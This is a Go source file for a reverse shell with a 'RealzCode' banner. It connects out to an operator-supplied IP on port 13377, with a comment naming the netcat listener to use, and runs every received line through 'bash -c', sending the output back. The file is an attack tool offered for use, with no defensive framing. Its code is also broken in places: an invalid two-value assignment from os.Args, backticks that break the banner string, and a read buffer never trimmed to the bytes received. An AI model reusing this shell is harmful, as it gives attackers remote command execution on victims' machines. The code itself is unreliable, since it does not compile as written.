package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	we := `
   _____            _      _____          _      
  |  __ \          | |    / ____|        | |     
  | |__) |___  __ _| |___| |     ___   __| | ___ 
  |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
  | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
  |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
`

	po := 13377 // nc -l -p 13377
	clientIP, _ := os.Args[1]

	we += fmt.Sprintf("Client IP: %s\n", clientIP)

	if len(os.Args) < 2 {
		fmt.Println("Please provide the IP address as a command-line argument.")
		os.Exit(1)
	}

	ip := os.Args[1]

	sock, err := net.Dial("tcp", fmt.Sprintf("%s:%d", ip, po))
	if err != nil {
		fmt.Printf("%s\n", err)
		os.Exit(1)
	}
	defer sock.Close()

	fmt.Printf("%s:%d\n", ip, po)
	fmt.Fprintf(sock, "%s\n", we)

	buf := make([]byte, po)

	for {
		fmt.Fprintf(sock, "$ ")
		_, err := sock.Read(buf)
		if err != nil {
			fmt.Printf("%s\n", err)
			break
		}

		cmd := strings.TrimSpace(string(buf))
		if cmd == "exit" {
			break
		}

		output, err := exec.Command("bash", "-c", cmd).CombinedOutput()
		if err != nil {
			output = []byte(err.Error())
		}

		sock.Write(output)
	}
}
